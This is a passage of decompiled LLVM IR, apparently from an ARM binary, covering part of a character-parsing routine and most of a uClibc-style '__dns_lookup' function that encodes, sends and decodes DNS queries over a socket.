  %v2_19248 = load i8, i8* %v1_19248, align 1
  %v3_19248 = zext i8 %v2_19248 to i32
  store i32 %v3_19248, i32* @ip, align 4
  %v2_1924c = mul nuw nsw i32 %v3_19248, 2
  %v2_19250 = add i32 %v2_1924c, %v2_19214.pre
  %v3_19254 = inttoptr i32 %v2_19250 to i8*
  %v4_19254 = load i8, i8* %v3_19254, align 1
  %v6_19254 = zext i8 %v4_19254 to i32
  %v1_19260 = and i32 %v6_19254, 8
  %v2_19260 = icmp eq i32 %v1_19260, 0
  br i1 %v2_19260, label %dec_label_pc_19268, label %dec_label_pc_19230

dec_label_pc_19268:                               ; preds = %dec_label_pc_19248
  %v8_1926c = icmp sgt i32 %v0_19298, 3
  br i1 %v8_1926c, label %dec_label_pc_19280, label %dec_label_pc_19270

dec_label_pc_19270:                               ; preds = %dec_label_pc_19268
  %v7_19270 = icmp eq i8 %v2_19248, 46
  br i1 %v7_19270, label %dec_label_pc_19278, label %dec_label_pc_192d4

dec_label_pc_19278:                               ; preds = %dec_label_pc_19270
  %v1_19278 = add i32 %v0_19284, 1
  store i32 %v1_19278, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19294

dec_label_pc_19280:                               ; preds = %dec_label_pc_19268
  %v2_19280 = icmp eq i8 %v2_19248, 0
  %v1_19284 = add i32 %v0_19284, 1
  store i32 %v1_19284, i32* %r0.global-to-local, align 4
  br i1 %v2_19280, label %dec_label_pc_19294, label %dec_label_pc_1928c

dec_label_pc_1928c:                               ; preds = %dec_label_pc_19280
  %v1_1928c = and i32 %v6_19254, 32
  %v2_1928c = icmp eq i32 %v1_1928c, 0
  br i1 %v2_1928c, label %dec_label_pc_192d4, label %dec_label_pc_19294

dec_label_pc_19294:                               ; preds = %dec_label_pc_1928c, %dec_label_pc_19280, %dec_label_pc_19278
  %v0_1921825 = phi i32 [ %v1_19284, %dec_label_pc_1928c ], [ %v1_19284, %dec_label_pc_19280 ], [ %v1_19278, %dec_label_pc_19278 ]
  %v4_19294 = mul i32 %v1_19294, 256
  %v5_19294 = or i32 %v0_19294, %v4_19294
  %v1_19298 = add nuw nsw i32 %v0_19298, 1
  %v7_192a0 = icmp slt i32 %v1_19298, 5
  br i1 %v7_192a0, label %dec_label_pc_19210, label %dec_label_pc_192a4

dec_label_pc_19210.lr.ph:                         ; preds = %entry
  %v2_19214.pre = load i32, i32* @global_var_2b254, align 4
  br label %dec_label_pc_19210

dec_label_pc_192a4:                               ; preds = %dec_label_pc_19294
  %v2_192a4 = icmp eq i32 %arg2, 0
  br i1 %v2_192a4, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_192a4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_192a4
  %v3_192c0 = call i32 @llvm.bswap.i32(i32 %v5_19294)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_192cc = inttoptr i32 %arg2 to i32*
  store i32 %v3_192c0, i32* %v3_192cc, align 4
  %v2_192d0.pre = load i32, i32* %stack_var_-20, align 4
  %v17_192d0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_192d0 = phi i32 [ 1, %bb ], [ %v17_192d0.pre, %bb41 ]
  %v2_192d0 = phi i32 [ %v3_191f8, %bb ], [ %v2_192d0.pre, %bb41 ]
  store i32 %v2_192d0, i32* @r4, align 4
  ret i32 %v17_192d0

dec_label_pc_192d4:                               ; preds = %dec_label_pc_19270, %dec_label_pc_1928c, %dec_label_pc_19210, %dec_label_pc_19230, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_191f8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_19214.pre, { 2, 1, 0 }
  uselistorder i32 %v1_19298, { 1, 0 }
  uselistorder i32 %v3_19248, { 0, 2, 1 }
  uselistorder i32 %v0_19284, { 0, 1, 3, 2 }
  uselistorder i32 %v3_191f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 8, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_192d4, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_19248, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_192e0 = load i32, i32* @r4, align 4
  %v6_192e0 = load i32, i32* @r5, align 4
  %v9_192e0 = load i32, i32* @r6, align 4
  %v12_192e0 = load i32, i32* @r7, align 4
  %v15_192e0 = load i32, i32* @r8, align 4
  %v18_192e0 = load i32, i32* @sb, align 4
  %v21_192e0 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_19300 = call i32 @malloc(i32 512)
  store i32 %v1_19300, i32* @r7, align 4
  %v1_1930c = call i32 @malloc(i32 1025)
  %v2_19310 = icmp eq i32 %v1_1930c, 0
  br i1 %v2_19310, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_19314 = load i32, i32* @r7, align 4
  %v3_19314 = icmp eq i32 %v1_19314, 0
  store i32 %v1_1930c, i32* %stack_var_-236, align 4
  br i1 %v3_19314, label %bb195, label %dec_label_pc_19328

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_19a08

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_19a08

dec_label_pc_19328:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_1932c = icmp eq i32 %arg3, 0
  br i1 %v2_1932c, label %dec_label_pc_19a08, label %dec_label_pc_19334

dec_label_pc_19334:                               ; preds = %dec_label_pc_19328
  %v2_19338 = load i8, i8* %arg1, align 1
  %v2_1933c = icmp eq i8 %v2_19338, 0
  br i1 %v2_1933c, label %dec_label_pc_19a08, label %dec_label_pc_19344

dec_label_pc_19344:                               ; preds = %dec_label_pc_19334
  %v3_19348 = call i32 @strlen(i8* nonnull %arg1)
  %v2_19350 = add i32 %v3_19348, %tmp
  %v1_19354 = add i32 %v2_19350, -1
  %v2_19354 = inttoptr i32 %v1_19354 to i8*
  %v3_19354 = load i8, i8* %v2_19354, align 1
  %v2_19358 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_19358, i32* @r4, align 4
  %v7_1935c = icmp eq i8 %v3_19354, 46
  %. = zext i1 %v7_1935c to i32
  store i32 %v2_19358, i32* @r0, align 4
  %v1_19380 = call i32 @__pthread_return_void()
  %v1_19390 = call i32 @__pthread_return_0()
  %v2_1939c = load i32, i32* @global_var_31840.1571, align 4
  %v2_193a0 = srem i32 %v2_1939c, %arg3
  %v3_193a8 = load i8, i8* @global_var_2b595.1574, align 1
  %v4_193a8 = zext i8 %v3_193a8 to i32
  %v2_193ac = load i8, i8* bitcast (i8** @global_var_2b594.1573 to i8*), align 4
  %v3_193ac = zext i8 %v2_193ac to i32
  %v4_193b4 = mul nuw nsw i32 %v4_193a8, 256
  %v5_193b4 = or i32 %v3_193ac, %v4_193b4
  store i32 %v5_193b4, i32* @sb, align 4
  store i32 %v2_193a0, i32* @sl, align 4
  store i32 %v2_19358, i32* @r0, align 4
  %v1_193c8 = call i32 @__pthread_return_void()
  %v0_193d4 = load i32, i32* @r5, align 4
  %v2_193f4 = ptrtoint i8* %stack_var_-188 to i32
  %v6_19438 = bitcast i8* %stack_var_-188 to i32*
  %v2_19518 = ptrtoint i32* %stack_var_-92 to i32
  %v3_195b0 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_19614 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_19960 = icmp eq i1 %v7_1935c, false
  %v7_19668 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_1974c = ptrtoint i32* %stack_var_-140 to i32
  %v9_19844 = icmp eq i32 %tmp147, %arg2
  %v7_197d8 = icmp eq i32 %arg2, 1
  %v2_19780 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_193d4, 3
  br i1 %tmp292, label %dec_label_pc_193dc.lr.ph.preheader.lr.ph, label %dec_label_pc_19a14

dec_label_pc_193dc.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_19344
  %v2_196ec = icmp eq i32 %tmp156, 0
  %v8_197dc = icmp eq i32 %arg2, 28
  br label %dec_label_pc_193dc.lr.ph.preheader

dec_label_pc_193dc:                               ; preds = %dec_label_pc_193dc.lr.ph, %dec_label_pc_199f8.backedge
  %v1_193e4 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_193dc.lr.ph ], [ %v0_1958c, %dec_label_pc_199f8.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_193dc.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_199f8.backedge ]
  %v7_193e0 = icmp eq i32 %v1_193e4, -1
  br i1 %v7_193e0, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_193dc
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_193dc, %bb199
  %v1_193e8 = xor i1 %v7_193e0, true
  call void @__pseudo_cond_branch(i1 %v1_193e8, i32 ptrtoint (i32* @global_var_14064.1576 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_193f4, i32* @r4, align 4
  %v0_193f8 = load i32, i32* @r7, align 4
  %v2_193fc = inttoptr i32 %v0_193f8 to i8*
  %v3_193fc = call i32 @__GI_memset(i8* %v2_193fc, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_1940c = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_19410 = load i32, i32* @sb, align 4
  %v1_19410 = add i32 %v0_19410, 1
  %v3_19418 = urem i32 %v1_19410, 65536
  store i32 %v3_19418, i32* @sb, align 4
  %v0_19424 = load i32, i32* @r7, align 4
  %v5_19430 = trunc i32 %v1_19410 to i8
  store i8 %v5_19430, i8* %stack_var_-188, align 1
  %v7_19438 = call i32 @__encode_header(i32* %v6_19438, i32 %v0_19424, i32 512, i32 1, i32 %v1_19410)
  store i32 %v7_19438, i32* @r5, align 4
  %v1_1943c = icmp slt i32 %v7_19438, 0
  br i1 %v1_1943c, label %dec_label_pc_19a14, label %dec_label_pc_19444

dec_label_pc_19444:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_1944c = load i32, i32* %stack_var_-236, align 4
  %v4_19450 = call i32 @strncpy(i32 %v2_1944c, i32 %tmp, i32 1025)
  store i32 %v2_19358, i32* @r0, align 4
  %v1_19468 = call i32 @__pthread_return_void()
  %v1_19478 = call i32 @__pthread_return_0()
  %v1_19488 = load i32, i32* @sl, align 4
  %v4_19488 = mul i32 %v1_19488, 4
  %v5_19488 = add i32 %v4_19488, %arg4
  %v6_19488 = inttoptr i32 %v5_19488 to i32*
  %v7_19488 = load i32, i32* %v6_19488, align 4
  store i32 %v7_19488, i32* @r6, align 4
  br i1 %v1_19484, label %dec_label_pc_194cc, label %dec_label_pc_19490

dec_label_pc_19490:                               ; preds = %dec_label_pc_19444
  %v2_19498 = load i32, i32* @global_var_31910.1579, align 4
  %v6_194a0 = icmp slt i32 %v6_199bc, %v2_19498
  br i1 %v6_194a0, label %dec_label_pc_194a4, label %dec_label_pc_194cc

dec_label_pc_194a4:                               ; preds = %dec_label_pc_19490
  store i32 ptrtoint (i32* @global_var_22fd4.1581 to i32), i32* @r1, align 4
  %v2_194ac = load i32, i32* %stack_var_-236, align 4
  %v4_194b0 = inttoptr i32 %v2_194ac to i8*
  %v5_194b0 = call i32 @__GI_strncat(i8* %v4_194b0, i32 ptrtoint (i32* @global_var_22fd4.1581 to i32), i32 1025, i32 %v2_19498)
  %v7_194c0 = load i32, i32* %v6_194c0, align 4
  store i32 %v7_194c0, i32* @r1, align 4
  %v4_194c8 = inttoptr i32 %v2_194ac to i8*
  %v5_194c8 = call i32 @__GI_strncat(i8* %v4_194c8, i32 %v7_194c0, i32 1025, i32 ptrtoint (i32* @global_var_318f0.1583 to i32))
  br label %dec_label_pc_194cc

dec_label_pc_194cc:                               ; preds = %dec_label_pc_19490, %dec_label_pc_19444, %dec_label_pc_194a4
  store i32 %v2_19358, i32* @r0, align 4
  store i32 103648, i32* @lr, align 4
  %v1_194dc = call i32 @__pthread_return_void()
  %v2_194e8 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_194e8, i32* %stack_var_-56, align 4
  %v0_194f8 = load i32, i32* @r7, align 4
  %v1_194f8 = load i32, i32* @r5, align 4
  %v2_194f8 = add i32 %v1_194f8, %v0_194f8
  %v1_194fc = sub i32 512, %v1_194f8
  %v8_19504 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_194f8, i32 %v1_194fc, i32 %arg2, i32 %v2_194e8, i32 %arg2, i32 1)
  store i32 %v8_19504, i32* @fp, align 4
  %v1_19508 = icmp slt i32 %v8_19504, 0
  br i1 %v1_19508, label %dec_label_pc_19a14, label %dec_label_pc_19510

dec_label_pc_19510:                               ; preds = %dec_label_pc_194cc
  store i32 0, i32* @r4, align 4
  %v0_19520 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_1952c = inttoptr i32 %v0_19520 to i8*
  %v4_1952c = call i32 @inet_pton(i32 10, i8* %v3_1952c, i32 %v2_19518)
  %v1_19530 = load i32, i32* @r4, align 4
  %v7_19534 = icmp sgt i32 %v4_1952c, %v1_19530
  br i1 %v7_19534, label %bb201, label %dec_label_pc_19510..thread11_crit_edge

dec_label_pc_19510..thread11_crit_edge:           ; preds = %dec_label_pc_19510
  %v3_19540.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_19510
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_19510..thread11_crit_edge, %bb201
  %v3_19540 = phi i8 [ %v3_19540.pre, %dec_label_pc_19510..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_19540 = sext i8 %v3_19540 to i32
  %v8_1953c.op = urem i32 %v1_19530, 256
  %v8_1953c.op.op = mul nuw nsw i32 %v8_1953c.op, 256
  %v4_19548 = select i1 %v7_19534, i32 %v8_1953c.op.op, i32 0
  %v5_19548 = or i32 %v4_19540, %v4_19548
  %v7_1954c = icmp eq i32 %v5_19548, 10
  br i1 %v7_1954c, label %dec_label_pc_19578, label %dec_label_pc_19560

dec_label_pc_19560:                               ; preds = %.thread11
  %v0_19564 = load i32, i32* @r6, align 4
  store i32 %v0_19564, i32* @r0, align 4
  %v1_19570 = call i32 @inet_addr(i32 %v0_19564)
  br label %dec_label_pc_19578

dec_label_pc_19578:                               ; preds = %.thread11, %dec_label_pc_19560
  %v0_1958c = call i32 @socket()
  %v1_19590 = icmp slt i32 %v0_1958c, 0
  br i1 %v1_19590, label %.thread, label %dec_label_pc_195a8

.thread:                                          ; preds = %dec_label_pc_19578
  br label %dec_label_pc_199f8.backedge

dec_label_pc_199f8.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_193dc, label %dec_label_pc_19a14

dec_label_pc_195a8:                               ; preds = %dec_label_pc_19578
  %v4_195b0 = call i32 @__libc_connect(i32 %v0_1958c, %sockaddr* nonnull %v3_195b0, i32 28)
  %v1_195b4 = icmp slt i32 %v4_195b0, 0
  br i1 %v1_195b4, label %dec_label_pc_195bc, label %dec_label_pc_195dc

dec_label_pc_195bc:                               ; preds = %dec_label_pc_195a8
  %v0_195bc = call i32 @__errno_location()
  %v1_195c0 = inttoptr i32 %v0_195bc to i32*
  %v2_195c0 = load i32, i32* %v1_195c0, align 4
  %v7_195c4 = icmp eq i32 %v2_195c0, 101
  br i1 %v7_195c4, label %dec_label_pc_19928, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_195bc
  br label %dec_label_pc_199f8.backedge

dec_label_pc_195dc:                               ; preds = %dec_label_pc_195a8
  %v0_195dc = load i32, i32* @r5, align 4
  %v1_195dc = load i32, i32* @fp, align 4
  %v2_195dc = add i32 %v1_195dc, %v0_195dc
  %v0_195e0 = load i32, i32* @r7, align 4
  %v4_195ec = inttoptr i32 %v0_195e0 to i32*
  %v5_195ec = call i32 @__libc_send(i32 %v0_1958c, i32* %v4_195ec, i32 %v2_195dc, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_1958c, i32* %stack_var_-44, align 4
  %v11_19614 = call i32 @__libc_poll(%pollfd* %v10_19614, i32 1, i32 10000, i32 1, i32 %v0_1958c, i32 1, i32 0)
  %v1_19618 = load i32, i32* @r4, align 4
  %v7_1961c = icmp sgt i32 %v11_19614, %v1_19618
  br i1 %v7_1961c, label %dec_label_pc_19620, label %dec_label_pc_19928

dec_label_pc_19620:                               ; preds = %dec_label_pc_195dc
  %v0_19628 = load i32, i32* @r7, align 4
  %v5_19630 = inttoptr i32 %v0_19628 to i32*
  %v6_19630 = call i32 @__libc_recv(i32 %v0_1958c, i32* %v5_19630, i32 512, i32 %v1_19618, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_19630, i32* @fp, align 4
  %v7_1963c = icmp slt i32 %v6_19630, 12
  br i1 %v7_1963c, label %dec_label_pc_1995c, label %dec_label_pc_19640

dec_label_pc_19640:                               ; preds = %dec_label_pc_19620
  %v0_19640 = load i32, i32* @r7, align 4
  %v2_19648 = inttoptr i32 %v0_19640 to i8*
  %v3_19648 = call i32 @__decode_header(i8* %v2_19648, i32 %v2_193f4)
  %v3_1964c = load i8, i8* %stack_var_-188, align 1
  %v4_1964c = sext i8 %v3_1964c to i32
  store i32 %v4_1964c, i32* @r6, align 4
  %v1_19650 = load i32, i32* @sb, align 4
  %v9_19650 = icmp eq i32 %v4_1964c, %v1_19650
  br i1 %v9_19650, label %dec_label_pc_19658, label %dec_label_pc_1995c

dec_label_pc_19658:                               ; preds = %dec_label_pc_19640
  %v1_1965c = load i32, i32* @r4, align 4
  %v9_1965c = icmp eq i32 %tmp157, %v1_1965c
  br i1 %v9_1965c, label %dec_label_pc_1995c, label %dec_label_pc_19664

dec_label_pc_19664:                               ; preds = %dec_label_pc_19658
  br i1 %v7_19668, label %dec_label_pc_19670, label %dec_label_pc_196ec

dec_label_pc_19670:                               ; preds = %dec_label_pc_19664
  %v9_19674 = icmp eq i32 %., %v1_1965c
  br i1 %v9_19674, label %dec_label_pc_1967c, label %dec_label_pc_196e0

dec_label_pc_1967c:                               ; preds = %dec_label_pc_19670
  store i32 %v2_19358, i32* @r5, align 4
  store i32 %v2_19358, i32* @r0, align 4
  %v1_19694 = call i32 @__pthread_return_void()
  %v1_196a4 = call i32 @__pthread_return_0()
  store i32 %v2_19358, i32* @r0, align 4
  %v2_196b0 = load i32, i32* @global_var_31910.1579, align 4
  %v1_196c0 = call i32 @__pthread_return_void()
  %v1_196c8 = add i32 %v2_196b0, -1
  store i32 %v1_196c8, i32* @r4, align 4
  %v5_196d0 = icmp slt i32 %v6_199bc, %v1_196c8
  br i1 %v5_196d0, label %.thread19, label %dec_label_pc_196e0

.thread19:                                        ; preds = %dec_label_pc_1967c
  %v7_196d0 = add i32 %v6_199bc, 1
  %v6_196d4 = load i32, i32* @r6, align 4
  store i32 %v6_196d4, i32* @sb, align 4
  br label %dec_label_pc_199f8.outer.backedge

dec_label_pc_196e0:                               ; preds = %dec_label_pc_1967c, %dec_label_pc_19670
  %v0_196e0 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_19710

dec_label_pc_196ec:                               ; preds = %dec_label_pc_19664
  br i1 %v2_196ec, label %dec_label_pc_196f4, label %dec_label_pc_1995c

dec_label_pc_196f4:                               ; preds = %dec_label_pc_196ec
  br i1 %tmp198, label %dec_label_pc_19708, label %dec_label_pc_19720.preheader

dec_label_pc_19720.preheader:                     ; preds = %dec_label_pc_196f4
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_19720

dec_label_pc_19708:                               ; preds = %dec_label_pc_196f4
  %v0_19708 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_19710

dec_label_pc_19710:                               ; preds = %dec_label_pc_196e0, %dec_label_pc_19708
  %storemerge4 = phi i32 [ %v0_19708, %dec_label_pc_19708 ], [ %v0_196e0, %dec_label_pc_196e0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_19708 ], [ 1, %dec_label_pc_196e0 ]
  %v2_19710 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_19710, align 4
  br label %dec_label_pc_19a24

dec_label_pc_19718:                               ; preds = %dec_label_pc_19720
  %v2_19718 = call i32 @__length_question(i32 %v0_1972c, i32 %v0_19728)
  %v0_1971c = load i32, i32* @r5, align 4
  %v2_1971c = add i32 %v0_1971c, %v2_19718
  store i32 %v2_1971c, i32* @r5, align 4
  %v0_19724.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19720

dec_label_pc_19720:                               ; preds = %dec_label_pc_19720.preheader, %dec_label_pc_19718
  %v0_19728 = phi i32 [ 12, %dec_label_pc_19720.preheader ], [ %v2_1971c, %dec_label_pc_19718 ]
  %v0_19730 = phi i32 [ 0, %dec_label_pc_19720.preheader ], [ %v0_19724.pre, %dec_label_pc_19718 ]
  store i32 %v0_19728, i32* @r1, align 4
  %v0_1972c = load i32, i32* @r7, align 4
  store i32 %v0_1972c, i32* @r0, align 4
  %v1_19730 = add i32 %v0_19730, 1
  store i32 %v1_19730, i32* @r4, align 4
  %v5_19734 = icmp slt i32 %v0_19730, 1
  br i1 %v5_19734, label %dec_label_pc_19718, label %dec_label_pc_19738

dec_label_pc_19738:                               ; preds = %dec_label_pc_19720
  br label %dec_label_pc_19894

dec_label_pc_1974c:                               ; preds = %bb205
  store i32 %v2_1974c, i32* @r4, align 4
  %v0_19750 = load i32, i32* @r7, align 4
  %v0_19758 = load i32, i32* @fp, align 4
  %v5_19760 = call i32 @__decode_answer(i32 %v0_19750, i32 %v0_19754, i32 %v0_19758, i32* nonnull %stack_var_-140)
  %v1_19764 = icmp slt i32 %v5_19760, 0
  br i1 %v1_19764, label %dec_label_pc_19770, label %dec_label_pc_1978c

dec_label_pc_19770:                               ; preds = %dec_label_pc_1974c
  %v2_19774 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_19774, label %dec_label_pc_1995c, label %dec_label_pc_1977c

dec_label_pc_1977c:                               ; preds = %dec_label_pc_19770
  br i1 %v2_19780, label %dec_label_pc_1995c, label %dec_label_pc_198a8

dec_label_pc_1978c:                               ; preds = %dec_label_pc_1974c
  %v2_19790 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_19790, label %dec_label_pc_19834, label %dec_label_pc_19798

dec_label_pc_19798:                               ; preds = %dec_label_pc_1978c
  %v0_19798 = load i32, i32* @r8, align 4
  %v6_1979c = add i32 %v0_19798, 36
  %v7_1979c = inttoptr i32 %v6_1979c to i32*
  %v8_1979c = load i32, i32* %v7_1979c, align 4
  store i32 %v8_1979c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_1974c, i32* @r1, align 4
  store i32 %v0_19798, i32* @r0, align 4
  %v0_197b8 = call i32 @memcpy()
  %v0_197bc = load i32, i32* @r8, align 4
  %v1_197bc = add i32 %v0_197bc, 4
  %v2_197bc = inttoptr i32 %v1_197bc to i32*
  %v3_197bc = load i32, i32* %v2_197bc, align 4
  %v7_197c0 = icmp eq i32 %v3_197bc, 24
  br i1 %v7_197c0, label %dec_label_pc_197e4, label %dec_label_pc_197c8

dec_label_pc_197c8:                               ; preds = %dec_label_pc_19798
  %v1_197c8 = add i32 %v0_197bc, 28
  %v2_197c8 = inttoptr i32 %v1_197c8 to i32*
  %v3_197c8 = load i32, i32* %v2_197c8, align 4
  %v2_197cc = icmp eq i32 %v3_197c8, 0
  br i1 %v2_197cc, label %dec_label_pc_198a8, label %dec_label_pc_197d4

dec_label_pc_197d4:                               ; preds = %dec_label_pc_197c8
  br i1 %v7_197d8, label %dec_label_pc_197e4, label %bb203

bb203:                                            ; preds = %dec_label_pc_197d4
  br i1 %v8_197dc, label %dec_label_pc_197e4, label %dec_label_pc_198a8

dec_label_pc_197e4:                               ; preds = %dec_label_pc_197d4, %bb203, %dec_label_pc_19798
  %v9_197e8 = icmp eq i32 %v3_197bc, %arg2
  br i1 %v9_197e8, label %dec_label_pc_197fc, label %dec_label_pc_197f0

dec_label_pc_197f0:                               ; preds = %dec_label_pc_197e4
  %v1_197f0 = inttoptr i32 %v0_197bc to i32*
  %v2_197f0 = load i32, i32* %v1_197f0, align 4
  %v1_197f4 = call i32 @free(i32 %v2_197f0)
  br label %dec_label_pc_19880

dec_label_pc_197fc:                               ; preds = %dec_label_pc_197e4
  %v1_19804 = add i32 %v0_197bc, 16
  %v2_19804 = inttoptr i32 %v1_19804 to i32*
  %v3_19804 = load i32, i32* %v2_19804, align 4
  %v2_19808 = sub i32 %tmp155, %stack_var_-192.0
  %v1_1980c = add i32 %v2_19808, -1
  %v1_19810 = add i32 %v3_19804, 4
  %v2_19814 = mul i32 %v1_19810, %v1_1980c
  %v1_19818 = add i32 %v0_197bc, 32
  %v2_19818 = inttoptr i32 %v1_19818 to i32*
  %v3_19818 = load i32, i32* %v2_19818, align 4
  %v2_19820 = add i32 %v0_197bc, 36
  %v3_19820 = inttoptr i32 %v2_19820 to i32*
  store i32 %v1_1980c, i32* %v3_19820, align 4
  %tmp294 = icmp ugt i32 %v2_19814, %v3_19818
  br i1 %tmp294, label %dec_label_pc_198a8, label %dec_label_pc_197fc.dec_label_pc_1987c_crit_edge

dec_label_pc_197fc.dec_label_pc_1987c_crit_edge:  ; preds = %dec_label_pc_197fc
  %v1_1987c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1987c

dec_label_pc_19834:                               ; preds = %dec_label_pc_1978c
  %v3_19834 = load i32, i32* %stack_var_-140, align 4
  %v1_19838 = call i32 @free(i32 %v3_19834)
  br i1 %v9_19844, label %dec_label_pc_1984c, label %dec_label_pc_19880

dec_label_pc_1984c:                               ; preds = %dec_label_pc_19834
  %v0_1984c = load i32, i32* @r8, align 4
  %v1_1984c = add i32 %v0_1984c, 16
  %v2_1984c = inttoptr i32 %v1_1984c to i32*
  %v3_1984c = load i32, i32* %v2_1984c, align 4
  %v9_19854 = icmp eq i32 %v3_1984c, %tmp146
  br i1 %v9_19854, label %dec_label_pc_1985c, label %dec_label_pc_19954

dec_label_pc_1985c:                               ; preds = %dec_label_pc_1984c
  %v1_1985c = add i32 %v0_1984c, 36
  %v2_1985c = inttoptr i32 %v1_1985c to i32*
  %v3_1985c = load i32, i32* %v2_1985c, align 4
  %v1_19860 = add i32 %v0_1984c, 28
  %v2_19860 = inttoptr i32 %v1_19860 to i32*
  %v3_19860 = load i32, i32* %v2_19860, align 4
  %v3_19864 = mul i32 %v3_1985c, %tmp146
  %v4_19864 = add i32 %v3_19860, %v3_19864
  store i32 %v4_19864, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_19870 = call i32 @memcpy()
  %v0_19874 = load i32, i32* @r8, align 4
  %v1_19874 = add i32 %v0_19874, 36
  %v2_19874 = inttoptr i32 %v1_19874 to i32*
  %v3_19874 = load i32, i32* %v2_19874, align 4
  %v1_19878 = add i32 %v3_19874, 1
  br label %dec_label_pc_1987c

dec_label_pc_1987c:                               ; preds = %dec_label_pc_197fc.dec_label_pc_1987c_crit_edge, %dec_label_pc_1985c
  %v1_1987c = phi i32 [ %v0_19874, %dec_label_pc_1985c ], [ %v1_1987c.pre, %dec_label_pc_197fc.dec_label_pc_1987c_crit_edge ]
  %storemerge5 = phi i32 [ %v1_19878, %dec_label_pc_1985c ], [ 0, %dec_label_pc_197fc.dec_label_pc_1987c_crit_edge ]
  %v2_1987c = add i32 %v1_1987c, 36
  %v3_1987c = inttoptr i32 %v2_1987c to i32*
  store i32 %storemerge5, i32* %v3_1987c, align 4
  br label %dec_label_pc_19880

dec_label_pc_19880:                               ; preds = %dec_label_pc_19834, %dec_label_pc_197f0, %dec_label_pc_1987c
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_1987c ], [ 0, %dec_label_pc_19834 ], [ %stack_var_-212.2, %dec_label_pc_197f0 ]
  %v1_19888 = add i32 %stack_var_-192.0, 1
  %v0_19890 = load i32, i32* @r5, align 4
  %v2_19890 = add i32 %v0_19890, %v5_19760
  store i32 %v2_19890, i32* @r5, align 4
  br label %dec_label_pc_19894

dec_label_pc_19894:                               ; preds = %dec_label_pc_19738, %dec_label_pc_19880
  %v0_19754 = phi i32 [ %v0_19728, %dec_label_pc_19738 ], [ %v2_19890, %dec_label_pc_19880 ]
